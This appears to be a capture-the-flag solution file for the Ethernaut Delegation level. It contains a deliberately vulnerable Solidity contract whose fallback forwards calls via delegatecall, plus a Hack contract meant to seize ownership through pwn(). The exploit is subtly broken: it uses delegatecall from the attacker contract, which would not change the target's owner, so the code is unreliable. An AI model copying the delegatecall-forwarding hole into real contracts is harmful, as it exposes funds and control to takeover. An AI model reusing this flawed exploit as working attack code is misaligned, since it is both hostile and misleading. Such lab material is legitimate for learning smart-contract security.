// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract Hack {
    event Response(bool success, bytes data);

    // set the address below to the instance address of your Ethernaut level
    // this address points to your Delegation contract, not the Delegate contract

    Delegation delegationContract = Delegation(0xf8e81D47203A594245E36C48e151709F0C19fBe8);

    function exploit() public {

      // we then try to call the pwn() function
      // since the function does not exist, it falls back to the fallback method
      (bool success, bytes memory data) = address(delegationContract).delegatecall(abi.encodeWithSignature("pwn()"));
    
      emit Response(success, data);
    }
}